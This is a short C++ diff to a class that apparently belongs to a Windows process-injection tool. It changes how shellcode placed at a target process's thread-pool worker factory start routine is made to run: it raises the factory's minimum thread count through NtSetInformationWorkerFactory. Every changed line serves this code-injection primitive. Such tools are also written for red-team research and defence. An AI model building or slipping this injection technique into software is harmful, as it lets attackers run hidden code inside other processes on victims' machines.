@@ -59,9 +59,24 @@ WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwT
 {
 }
 
+LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory()
+{
+	/* 
+		This execution primitive does not need to allocate memory, it writes to an already allocated memory
+		So we just return a pointer to the allocate memory
+	*/
+	return m_WorkerFactoryInformation.StartRoutine; 
+}
+
+
 void WorkerFactoryStartRoutineOverwrite::SetupExecution()
 {
-	WriteMemory(*m_p_hTargetPid, m_WorkerFactoryInformation.StartRoutine, m_cShellcode, m_szShellcodeSize);
+	/* 
+		Shellcode was already written to the target process's worker factory start routine
+		We trigger execution of it by setting the minimum thread number 
+	*/
+	ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
+	w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
 }
 
 WorkerFactoryStartRoutineOverwrite::~WorkerFactoryStartRoutineOverwrite()
